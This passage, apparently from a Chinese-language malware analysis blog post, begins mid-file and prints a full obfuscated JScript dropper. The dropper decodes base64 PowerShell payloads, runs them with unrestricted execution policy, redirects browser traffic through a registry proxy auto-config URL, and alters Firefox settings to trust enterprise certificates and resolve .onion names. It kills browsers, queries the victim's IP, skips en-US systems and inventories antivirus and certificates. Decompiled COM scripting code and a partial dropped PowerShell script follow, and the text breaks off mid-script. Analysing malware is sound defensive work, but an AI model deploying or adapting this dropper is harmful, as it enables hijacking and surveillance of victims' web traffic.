AKEdldC1DaGlsZEl0ZW0gY2VydDpcQ3VycmVudFVzZXJcUk9PVHxXaGVyZS1PYmplY3QgeyRfLlN1YmplY3QgLWxpa2UgIipDT01PRE8gUlNBIEV4dGVuZGVkIFZhbGlkYXRpb24gU2VjdXJlIFNlcnZlciBDQSAyKiIgLW9yICRfLlN1YmplY3QgLWxpa2Ug&quot;+&quot;IipDT01PRE8gQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkqIn18Rm9yRWFjaC1PYmplY3QgeyJ7MH0gKHsxfSkiIC1mICgkXy5UaHVtYnByaW50LCRfLk5vdEJlZm9yZSl9KTsKICBpZiAoLU5PVCAkQ2VydHMuY291bnQgLWVxIDApewogICAgTG9nV3JpdGUoIkNlcnRz&quot;+&quot;IGluc3RhbGxlZDogJ3swfSciIC1mICgkQ2VydHMgLWpvaW4gIjsgIikpOwogIH1lbHNlIHsKICAgIExvZ1dyaXRlKCJDZXJ0cyBub3QgZm91bmQiKTsKICB9CiAgdHJ5ewogICAgJHByb2MgPSBHZXQtUHJvY2VzcyB8IFdoZXJlLU9iamVjdCB7JF8uUHJvY2Vzc05h&quot;+&quot;bWUgLWxpa2UgInRvcioiIC1vciAkXy5Qcm9jZXNzTmFtZSAtbGlrZSAic29jYXQqIn18U2VsZWN0IC1Qcm9wZXJ0eSBAeyBOYW1lPSJPdXQiOyBFeHByZXNzaW9uPXsiSUQ6ezB9YG5OYW1lOnsxfWBuUGF0aDp7Mn1gbi0tLS0tLS0tLS0tLS0iIC1mICRfLklkLCRf&quot;+&quot;LlByb2Nlc3NOYW1lLCRfLlBhdGh9fXxTZWxlY3QgLWV4cGFuZCBPdXQ7CiAgICBMb2dXcml0ZSgiUHJvY2Nlc3MgbGlzdDpgbnswfSIgLWYgKCRwcm9jIC1qb2luICJgbiIpKTsKICB9CiAgY2F0Y2ggewogICAgTG9nV3JpdGUoIkVSUk9SOiBDYW4ndCBnZXQgcHJv&quot;+&quot;Y2Nlc3MgbGlzdCIpOwogIH0KICAkRGVzdFRQPSRlbnY6QUxMVVNFUlNQUk9GSUxFOwogIHRyeXsKICAgICRkaXJzPWRpcigkRGVzdFRQKSAtRXJyb3JBY3Rpb24gU3RvcDsKICAgIExvZ1dyaXRlKCJMaXN0IGRpciBbezB9XTogezF9IiAtZiAoJERlc3RUUCwgKCgk&quot;+&quot;ZGlyc3xTZWxlY3QgLWV4cGFuZCBOYW1lKSAtam9pbiAiOyAiKSkpOwogICAgZm9yZWFjaCgkZGlyIGluICRkaXJzKXsKICAgICAgICB0cnl7CiAgICAgICAgICAgICRzdWJkaXI9ZGlyKCRkaXIuRnVsbE5hbWUpIC1FcnJvckFjdGlvbiBTdG9wOwogICAgICAgICAg&quot;+&quot;ICBMb2dXcml0ZSgiTGlzdCBkaXIgW3swfV06ezF9IiAtZiAoJGRpci5GdWxsTmFtZSwgKCgkc3ViZGlyfFNlbGVjdCAtZXhwYW5kIE5hbWUpIC1qb2luICI7ICIpKSk7CiAgICAgICAgfQogICAgICAgIGNhdGNoewogICAgICAgICAgICBMb2dXcml0ZSgiRVJST1I6&quot;+&quot;IENhbid0IGxpc3QgZGlyIHswfSIgLWYgJGRpci5GdWxsTmFtZSk7CiAgICAgICAgfQogICAgfQogIH0KICBjYXRjaCB7CiAgICBMb2dXcml0ZSgiRVJST1I6IENhbid0IGxpc3QgZGlyIHswfSIgLWYgJERlc3RUUCk7CiAgfQoKICAkYXZsaXN0PShHZXQtV21pT2Jq&quot;+&quot;ZWN0IC1OYW1lc3BhY2UgInJvb3RcU2VjdXJpdHlDZW50ZXIyIiAtUXVlcnkgIlNFTEVDVCAqIEZST00gQW50aVZpcnVzUHJvZHVjdCIgIEBwc2JvdW5kcGFyYW1ldGVyc3xTZWxlY3QgLWV4cGFuZCBEaXNwbGF5TmFtZSk7CiAgaWYgKC1OT1QgJGF2bGlzdC5jb3Vu&quot;+&quot;dCAtZXEgMCl7CiAgICBMb2dXcml0ZSgiQXYgaW5zdGFsbGVkOiAnezB9JyIgLWYgKCRhdmxpc3QgLWpvaW4gIjsgIikpOwogIH1lbHNlIHsKICAgIExvZ1dyaXRlKCJBdiBub3QgZm91bmQiKTsKICB9Cn0KZnVuY3Rpb24gU3RhcnRXb3JrKCl7CiAgTG9nV3JpdGUg&quot;+&quot;IlN0YXJ0IExvZyBtb2R1bGUiOwogIENoZWNrSW5zdGFsbDsKICBVcGxvYWRMb2c7Cn0KU3RhcnRXb3JrOwo=&quot;};var LbXYsoZotGh={_keyStr:&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;,encode:function(e){var t=&quot;&quot;;var n,r,i,s,o,u,a;var f=0;e=LbXYsoZotGh._utf8_encode(e);while(f&lt;e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n&gt;&gt;2;o=(n&amp;3)&lt;&lt;4|r&gt;&gt;4;u=(r&amp;15)&lt;&lt;2|i&gt;&gt;6;a=i&amp;63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},nzJryrgLluyiPwC:function(e){var t=&quot;&quot;;var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,&quot;&quot;);while(f&lt;e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s&lt;&lt;2|o&gt;&gt;4;r=(o&amp;15)&lt;&lt;4|u&gt;&gt;2;i=(u&amp;3)&lt;&lt;6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=LbXYsoZotGh._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/rn/g,&quot;n&quot;);var t=&quot;&quot;;for(var n=0;n&lt;e.length;n++){var r=e.charCodeAt(n);if(r&lt;128){t+=String.fromCharCode(r)}else if(r&gt;127&amp;&amp;r&lt;2048){t+=String.fromCharCode(r&gt;&gt;6|192);t+=String.fromCharCode(r&amp;63|128)}else{t+=String.fromCharCode(r&gt;&gt;12|224);t+=String.fromCharCode(r&gt;&gt;6&amp;63|128);t+=String.fromCharCode(r&amp;63|128)}}return t},_utf8_decode:function(e){var t=&quot;&quot;;var n=0;var r=c1=c2=0;while(n&lt;e.length){r=e.charCodeAt(n);if(r&lt;128){t+=String.fromCharCode(r);n++}else if(r&gt;191&amp;&amp;r&lt;224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&amp;31)&lt;&lt;6|c2&amp;63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&amp;15)&lt;&lt;12|(c2&amp;63)&lt;&lt;6|c3&amp;63);n+=3}}return t}};var SGUUmXppVIOh={    Jer:function(KIp,uIDujligs){        var OZK = new ActiveXObject(&quot;ADODB.Stream&quot;);        OZK.Open();        OZK.Type=BINARY_STREAM_TYPE;        var LysWjSbnQFw = new ActiveXObject(&quot;ADODB.Recordset&quot;);        var yrHlCecaTbDwO=uIDujligs.length*2;        LysWjSbnQFw.Fields.Append(&quot;data&quot;,204,yrHlCecaTbDwO,0x80);        LysWjSbnQFw.Open();        LysWjSbnQFw.AddNew();        LysWjSbnQFw.Fields(&quot;data&quot;).AppendChunk(uIDujligs);        LysWjSbnQFw.Update();        LysWjSbnQFw.MoveFirst();        var binArray = LysWjSbnQFw(&quot;data&quot;).GetChunk(yrHlCecaTbDwO);        LysWjSbnQFw.Close();        eval(&quot;OZK.Wri&quot; + &quot;te(bin&quot;+&quot;Array)&quot;);        OZK.Position=0;        if(VTU.FileExists(KIp)){            VTU.DeleteFile(KIp);        }        OZK.SaveToFile(KIp);        OZK.Close();        var outStreamA = new ActiveXObject(&quot;ADODB.Stream&quot;);        var outStreamB = new ActiveXObject(&quot;ADODB.Stream&quot;);        outStreamA.Type=TEXT_STREAM_TYPE;        outStreamB.Type=TEXT_STREAM_TYPE;        outStreamB.Charset = &quot;ISO-8859-1&quot;;        outStreamA.Open();        outStreamB.Open();        outStreamA.LoadFromFile(KIp);        outStreamA.Position = 0;         outStreamA.CopyTo(outStreamB);        outStreamA.Close();        outStreamB.SaveToFile(KIp,CREATE_OVERWRITE_SAVE_MODE);        outStreamB.Close();    },    QVn: function(m, n){        m = parseInt(m,10);        n = parseInt(n,10);        return Math.floor(Math.random() * (n - m + 1)) + m;    },    PsdPmHMCVqenzuN: function(RWTYk, eOUGCiHno){    //生成随机文件名，用于命名解密后的ps脚本        var xgVtJMwJgIjIpu = 0;        var weFKCALZLcXDGMD = &quot;&quot;;        var KeAR;        if (eOUGCiHno === undefined) {            eOUGCiHno = false;        }        while (xgVtJMwJgIjIpu &lt; RWTYk) {            KeAR = (Math.floor((Math.random() * 100)) % 94) + 33;            if (!eOUGCiHno) {                if ((KeAR &gt;= 33) &amp;&amp; (KeAR &lt;= 47)) {                    continue;                }                if ((KeAR &gt;= 58) &amp;&amp; (KeAR &lt;= 64)) {                    continue;                }                if ((KeAR &gt;= 91) &amp;&amp; (KeAR &lt;= 96)) {                    continue;                }                if ((KeAR &gt;= 123) &amp;&amp; (KeAR &lt;= 126)) {                    continue;                }            }            xgVtJMwJgIjIpu++;            weFKCALZLcXDGMD += String.fromCharCode(KeAR);        }        return weFKCALZLcXDGMD;    },    nahF: function(str){        return str.replace(/(^\s+)|(\s+$)/g, &quot;&quot;);    }};if (!String.format) {  String.format = function(format) {    var args = Array.prototype.slice.call(arguments, 1);    return format.replace(/{(\d+)}/g, function(match, number) {       return typeof args[number] != &quot;undefined&quot;        ? args[number]         : match      ;    });  };}function pjWBhLWlAGVeKiN(){    //ps脚本路径    this.kZNsJyERrbjMEdZ=SGUUmXppVIOh.PsdPmHMCVqenzuN(8)+&quot;.ps1&quot;;    this.lNTsAY=function(){        var iAoIOlPGFpaBof = new ActiveXObject(&quot;MSXML2&quot;+&quot;.XML&quot;+&quot;HTTP&quot;);        try{            iAoIOlPGFpaBof.open(&quot;GET&quot;,&quot;http://api.ipify.org/&quot;,false);            iAoIOlPGFpaBof.send();            if(iAoIOlPGFpaBof.status==200){                return SGUUmXppVIOh.nahF(iAoIOlPGFpaBof.responseText);            }        }catch(e){}        try{            iAoIOlPGFpaBof.open(&quot;GET&quot;,&quot;http://icanhazip.com/&quot;,false);            iAoIOlPGFpaBof.send();            if(iAoIOlPGFpaBof.status==200){                return SGUUmXppVIOh.nahF(iAoIOlPGFpaBof.responseText);            }        }catch(e){}        return &quot;&quot;;    };    this.qtPLqwQxQHKKe=function(){        sZTSiOfmguW.RegWrite(LbXYsoZotGh.nzJryrgLluyiPwC(&quot;SEtDV&quot;+&quot;VxTb2Z0d2FyZVxNaWNyb3NvZ&quot;+&quot;nRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm&quot;+&quot;5ldCBTZXR0aW5nc1xBdXRvRGV0ZWN0&quot;),0,&quot;REG_DWORD&quot;);        for(var i=0;i&lt;5;i++){            var nNxFkACp=this.lNTsAY();            if(nNxFkACp.length&gt;0){                this.EdFcz(String.format(&quot;http://127.0.0.1:5555/{0}.js?ip={1}&quot;,SGUUmXppVIOh.PsdPmHMCVqenzuN(8),nNxFkACp));            }        }    };    this.EdFcz=function(s){        sZTSiOfmguW.RegWrite(LbXYsoZotGh.nzJryrgLluyiPwC(&quot;SEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5nc1xBdXRvQ29uZmlnVVJM&quot;),s,&quot;REG_SZ&quot;);    };    this.CXaBSojpHZJEm=function(){        this.kZNsJyERrbjMEdZ=iOU+&quot;\\&quot;+this.kZNsJyERrbjMEdZ;        var uIDujligs=LbXYsoZotGh.nzJryrgLluyiPwC(kVQNRMoBaO.moZgTncSGjjMW);        uIDujligs=uIDujligs.replace(&quot;%CERT%&quot;,kVQNRMoBaO.oUXMMFdTE);        SGUUmXppVIOh.Jer(this.kZNsJyERrbjMEdZ,uIDujligs);        sZTSiOfmguW.Run(&quot;cmd /c powershell -ep Unrestricted -f \&quot;&quot;+this.kZNsJyERrbjMEdZ+&quot;\&quot; | find /v \&quot;\&quot; &gt;&gt; \&quot;&quot;+dEhkFnrZt+&quot;\&quot;&quot;,0,true);    };    this.BUUZMOIyOFXApCU=function(){        if(VTU.FileExists(this.kZNsJyERrbjMEdZ)){            VTU.DeleteFile(this.kZNsJyERrbjMEdZ);        }    };}function QPxG(){    //修改火狐配置文件    var SFrPOCQQqgWuzbr = DSoEmfpCHxm + &quot;\\Mozilla\\Firefox\\Profiles&quot;;    this.VqJKSQXiygGQzw=SGUUmXppVIOh.PsdPmHMCVqenzuN(8)+&quot;.ps1&quot;;    this.FPdjKpheWo=function(){        if(VTU.FolderExists(SFrPOCQQqgWuzbr)){            var ArrFirefoxProfileList=VTU.GetFolder(SFrPOCQQqgWuzbr).SubFolders;            if(ArrFirefoxProfileList.Count&gt;0){                var e = new Enumerator(ArrFirefoxProfileList);                e.moveFirst();                while (e.atEnd() == false){                    var folder=e.item();                    if(folder.Name.indexOf(&quot;.default&quot;)&gt;-1){                        return folder.Path;                    }                    e.moveNext();                }            }        }        return false;    };    this.InstallPac=function(){        var StrProfile=this.FPdjKpheWo();        if(StrProfile!=false){            var StrPrefsJs=StrProfile+LbXYsoZotGh.nzJryrgLluyiPwC(&quot;XHByZWZzLmpz&quot;);            if(VTU.FileExists(StrPrefsJs)){                var StrContent=VTU.OpenTextFile(StrPrefsJs,1).ReadAll();                var ArrContent=StrContent.split(&quot;\n&quot;);                var NewArrContent=[];                for(var i=0;i&lt;ArrContent.length;i++){                    if(ArrContent[i].indexOf(&quot;network.dns.blockDotOnion&quot;)!=-1){                        ArrContent[i]=ArrContent[i].replace(&quot;true&quot;,&quot;false&quot;);                    }                    if(ArrContent[i].indexOf(&quot;network.proxy.&quot;)==-1 &amp;&amp; ArrContent[i].indexOf(&quot;security.enterprise_roots.enabled&quot;)==-1){                        NewArrContent.push(ArrContent[i]);                    }                }                NewArrContent.push(&quot;user_pref(\&quot;network.dns.blockDotOnion\&quot;, false);&quot;);                NewArrContent.push(&quot;user_pref(\&quot;security.enterprise_roots.enabled\&quot;, true);&quot;);                StrContent=NewArrContent.join(&quot;\n&quot;);                var stream=VTU.CreateTextFile(StrPrefsJs, true);                stream.Write(StrContent);                stream.Close();            }        }    };    this.InstallCert=function(){        this.VqJKSQXiygGQzw=iOU+&quot;\\&quot;+this.VqJKSQXiygGQzw;        var uIDujligs=LbXYsoZotGh.nzJryrgLluyiPwC(kVQNRMoBaO.dDrnVhWm);        uIDujligs=uIDujligs.replace(&quot;%CERT%&quot;,kVQNRMoBaO.oUXMMFdTE);        SGUUmXppVIOh.Jer(this.VqJKSQXiygGQzw,uIDujligs);        sZTSiOfmguW.Run(&quot;cmd /c powershell -ep Unrestricted -f \&quot;&quot;+this.VqJKSQXiygGQzw+&quot;\&quot; | find /v \&quot;\&quot; &gt;&gt; \&quot;&quot;+dEhkFnrZt+&quot;\&quot;&quot;,0,true);    };    this.Close=function(){        if(VTU.FileExists(this.VqJKSQXiygGQzw)){            VTU.DeleteFile(this.VqJKSQXiygGQzw);        }    };}function C_TP(){    this.FileName=SGUUmXppVIOh.PsdPmHMCVqenzuN(SGUUmXppVIOh.QVn(5,10))+&quot;.ps1&quot;;    this.Install=function(){        var indexDomain=SGUUmXppVIOh.QVn(0,kVQNRMoBaO.LgiwpoajBw.length-1);        var Domain=kVQNRMoBaO.LgiwpoajBw[indexDomain];        this.FileName=sZTSiOfmguW.ExpandEnvironmentStrings(&quot;%ALLUSERSPROFILE%&quot;)+&quot;\\&quot;+this.FileName;        var uIDujligs=LbXYsoZotGh.nzJryrgLluyiPwC(kVQNRMoBaO.Ghq);        uIDujligs=uIDujligs.replace(/%DOMAIN%/g,Domain);        SGUUmXppVIOh.Jer(this.FileName,uIDujligs);        sZTSiOfmguW.Run(&quot;cmd /c powershell -ep Unrestricted -f \&quot;&quot;+this.FileName+&quot;\&quot; | find /v \&quot;\&quot; &gt;&gt; \&quot;&quot;+dEhkFnrZt+&quot;\&quot;&quot;,0,true);    };    this.Close=function(){        if(VTU.FileExists(this.FileName)){            VTU.DeleteFile(this.FileName);        }    };}function Kvkvfz(){    this.FileName=iOU+&quot;\\&quot;+SGUUmXppVIOh.PsdPmHMCVqenzuN(8)+&quot;.ps1&quot;;    this.lfjxeqjOrhPGUA=function(){        //查询ip        CotZ=new pjWBhLWlAGVeKiN();        PBPRfNXyqx=new QPxG();        XVEbnkh=new C_TP();    };    //主函数    this.dKrfMFdadkN=function(){        if(this.CheckTest()){            return false;        }        this.lfjxeqjOrhPGUA();        XVEbnkh.Install();        this.MXcIDEpEes();        this.vhQUbnorFnIqy();        this.fDBh();        this.Close();        this.sqtf();    };    this.vhQUbnorFnIqy=function(){        CotZ.CXaBSojpHZJEm();        CotZ.qtPLqwQxQHKKe();    };    this.fDBh=function(){        PBPRfNXyqx.InstallCert();        PBPRfNXyqx.InstallPac();    };    //写注册表    this.MXcIDEpEes=function(){        sZTSiOfmguW.Run(LbXYsoZotGh.nzJryrgLluyiPwC(&quot;dGFza2tpbGwgL0Y&quot;+&quot;gL2ltIGlleHBsb3JlLmV4ZQ==&quot;),0,false);        sZTSiOfmguW.Run(LbXYsoZotGh.nzJryrgLluyiPwC(&quot;dGFza2tpbGwgL0Yg&quot;+&quot;L2ltIGZpcmVmb3guZXhl&quot;),0,false);        sZTSiOfmguW.Run(LbXYsoZotGh.nzJryrgLluyiPwC(&quot;dGFza2tpbGwgL0YgL&quot;+&quot;2ltIGNocm9tZS5leGU=&quot;),0,false);    };    this.sqtf=function(){        var bData=LbXYsoZotGh.nzJryrgLluyiPwC(kVQNRMoBaO.EMAoYeN);        SGUUmXppVIOh.Jer(this.FileName,bData);        sZTSiOfmguW.Run(&quot;powershell -ep Unrestricted -f \&quot;&quot;+this.FileName+&quot;\&quot;&quot;,0,true);        if(VTU.FileExists(this.FileName)){            VTU.DeleteFile(this.FileName);        }    };    //检测操作系统语言版本    this.CheckTest=function(){        var langs = GetObject(&quot;winmgmts:\\\\.\\root\\cimv2&quot;).ExecQuery(&quot;Select * from Win32_OperatingSystem&quot;);        var arr = [];        for (var enumItems = new Enumerator(langs) ; !enumItems.atEnd() ; enumItems.moveNext()) {            var MUILanguages = enumItems.item().MUILanguages.toArray();            for (i in MUILanguages) {                arr.push(MUILanguages[i]);            }        }        var muilangs = arr.join(&quot;,&quot;);        if(muilangs==&#39;en-US&#39;){            return true;        }        return false;    }    this.Close=function(){        CotZ.BUUZMOIyOFXApCU();        PBPRfNXyqx.Close();        XVEbnkh.Close();    };   }var eGHfyRDGqtYby = new Kvkvfz();eGHfyRDGqtYby.dKrfMFdadkN();</code></pre><h2 id="com调用jscript代码"><a href="#com调用jscript代码" class="headerlink" title="com调用jscript代码"></a>com调用jscript代码</h2><pre><code>      1.  CoCreateInstance()创建javascript的引擎，获得jscript引擎的接口的IActiveScript       2.  实现回调调用接口IActiveScriptSite，通过IActiveScript-&gt;SetScriptSite()交给脚本回调      3.  IActiveScript-&gt;QueryInterface()取得IActiveScriptParse接口，IActiveScriptParse接口用来解析执行jscript脚本</code></pre><h3 id="获得IActiveScript接口"><a href="#获得IActiveScript接口" class="headerlink" title="获得IActiveScript接口"></a>获得IActiveScript接口</h3><p>先调用<code>CLSIDFromProgID</code>拿到对应脚本语言引擎接口的guid,这里是jscript，然后用<code>CoCreateInstance</code>创建一个脚本引擎实例，riid为<code>IID_IActiveScript</code>;<br>返回一个<code>IActiveScript</code>对象指针，</p><body bgcolor="#232323"><br><span style="white-space: pre; font-family: Consolas; "><br><span style="color:#ffd200">HRESULT __thiscall get_jscript_engine(LPVOID <em>this, LPCOLESTR lpszProgID, LPUNKNOWN pUnkOuter, DWORD dwClsContext)<br></em></span><span><span style="color:#c0c0c0">{                                                                            </span></span><br>  <span style="color:#73adad">LPVOID ppv</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+0h] [ebp-1Ch]<br>  </span><span style="color:#73adad">HRESULT v6</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+4h] [ebp-18h]<br>  </span><span style="color:#73adad">const IID guid</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+8h] [ebp-14h]<br><br>  ppv </span><span style="color:#c0c0c0">= </span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#ff633c">// lpSzProgID &quot;jscript&quot;<br>  </span><span style="color:#00ffff">v6 </span><span style="color:#c0c0c0">= </span><span style="color:#f187ff">CLSIDFromProgID</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">lpszProgID</span><span style="color:#c0c0c0">, &amp;</span><span style="color:#00ffff">guid</span><span style="color:#c0c0c0">);<br>  if…<br>  </span><span style="color:#ababab">if </span><span style="color:#c0c0c0">( </span><span style="color:#00ffff">v6 &gt;</span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0 </span><span style="color:#c0c0c0">)<br>    </span><span style="color:#ff633c">// riid =  &#039;{BB1A2AE1-A4F9-11cf-8F20-00805F2CD064}&#039;;<br>    </span><span style="color:#00ffff">v6 </span><span style="color:#c0c0c0">= </span><span style="color:#f187ff">CoCreateInstance</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">guid</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">pUnkOuter</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">dwClsContext</span><span style="color:#c0c0c0">, &amp;</span><span style="color:#ffecbb">riid</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">ppv</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ababab">return </span><span style="color:#00ffff">v6</span><span style="color:#c0c0c0">;<br></span><span style="background:#646464"></span><span style="background:#00ffff"></span><span><span style="color:#c0c0c0">}                                                                            </span></span><br></span></body><h3 id="run-jscript脚本"><a href="#run-jscript脚本" class="headerlink" title="run jscript脚本"></a>run jscript脚本</h3><body bgcolor="#232323"><br><span style="white-space: pre; font-family: Consolas;"><br><br><span style="color:#73adad">int <strong>thiscall run_jscript(JSEngine <em>this, encry_code </em>a2)<br></strong></span><span><span style="color:#c0c0c0">{                                                                                </span></span><br>  <span style="color:#73adad">int v3</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST40_4<br>  </span><span style="color:#ffd200">_DWORD *v4</span><span style="color:#c0c0c0">; </span><span style="color:#ffd200">// </span><span style="color:#00ffff">ST24_4<br>  </span><span style="color:#ffd200">int (stdcall <em>**v5)(_DWORD, void </em>, int)</span><span style="color:#c0c0c0">; </span><span style="color:#ffd200">// </span><span style="color:#00ffff">eax<br>  </span><span style="color:#73adad">int v6</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">eax<br>  </span><span style="color:#ffd200">int v7</span><span style="color:#c0c0c0">; </span><span style="color:#ffd200">// </span><span style="color:#00ffff">ST38_4<br>  </span><span style="color:#73adad">WCHAR <em>lpWideCharStr</em></span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST34_4<br>  </span><span style="color:#73adad">int v9</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST30_4<br>  </span><span style="color:#73adad">int v10</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST2C_4<br><br>  </span><span style="color:#ffecbb">get_jscript_engine</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;scriptEngine_, L&quot;</span><span style="color:#ffba18">JScript&quot;</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0x17u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v3 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">QueryInterface</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;scriptEngine_);<br>  </span><span style="color:#ff633c">// COleScript::SetScriptSite<br>  </span><span style="color:#c0c0c0">((<em></em></span><span style="color:#00ffff">v3 </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">0xC</span><span style="color:#c0c0c0">))(</span><span style="color:#00ffff">v3</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v4 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">sub_10C3380</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;field_C);<br>  </span><span style="color:#00ffff">v5 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">QueryInterface</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;scriptEngine_);<br>  </span><span style="color:#ffecbb">COleScript::QueryInterface</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v5</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">v4</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v6 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">QueryInterface</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;field_C);<br>  </span><span style="color:#ff633c">// COleScript::InitNew<br>  </span><span style="color:#c0c0c0">((<em></em></span><span style="color:#00ffff">v6 </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">0xC</span><span style="color:#c0c0c0">))(</span><span style="color:#00ffff">v6</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v7 </span><span style="color:#c0c0c0">= </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;size;<br>  </span><span style="color:#00ffff">lpWideCharStr </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">operator new[]</span><span style="color:#c0c0c0">(</span><span style="color:#ababab">2 </span><span style="color:#c0c0c0"> (</span><span style="color:#00ffff">v7 </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">1</span><span style="color:#c0c0c0">));<br>  </span><span style="color:#ff633c">// 将jscript代码字符都转成unicode<br>  </span><span style="color:#f187ff">MultiByteToWideChar</span><span style="color:#c0c0c0">(</span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;addr, </span><span style="color:#ababab">-1</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">lpWideCharStr</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">v7 </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">1</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v9 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">QueryInterface</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;field_C);<br>  </span><span style="color:#ff633c">// COleScript::ParseScriptText<br>  </span><span style="color:#c0c0c0">(<em>(</em></span><span style="color:#00ffff">v9 </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">0x14</span><span style="color:#c0c0c0">))(</span><span style="color:#00ffff">v9</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">v9</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">lpWideCharStr</span><span style="color:#c0c0c0">, &amp;</span><span style="color:#ffecbb">dword_1103518</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">2</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v10 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">QueryInterface</span><span style="color:#c0c0c0">(&amp;</span><span style="color:#00ffff">this</span><span style="color:#c0c0c0">-&gt;scriptEngine_);<br>  </span><span style="color:#ff633c">// COleScript::SetScriptState<br>  // 在这个函数内部执行jscript代码<br>  </span><span style="color:#ababab">return </span><span style="color:#c0c0c0">(<em>(</em></span><span style="color:#00ffff">v10 </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">20</span><span style="color:#c0c0c0">))(</span><span style="color:#00ffff">v10</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">2</span><span style="color:#c0c0c0">);<br></span><span style="background:#646464"></span><span style="background:#c0c0c0"></span><span><span style="color:#c0c0c0">}                                                                                </span></span><br></span></body><h2 id="脚本行为"><a href="#脚本行为" class="headerlink" title="脚本行为"></a>脚本行为</h2><p>脚本会释放出一个powershell脚本，可能是c2c连接已经失效，后续的行为没跑出来</p><pre><code class="powershell">$SH_TYPE_SCHEDULED_TASK=1;$SH_TYPE_TASK_SCHEDULER=2;$schedulerType=$SH_TYPE_SCHEDULED_TASK;function FVRClsggMRAZ{param([string]$zipfile, [string]$destination);$7z = Join-Path $env:ALLUSERSPROFILE &#39;7za.exe&#39;;if (-NOT 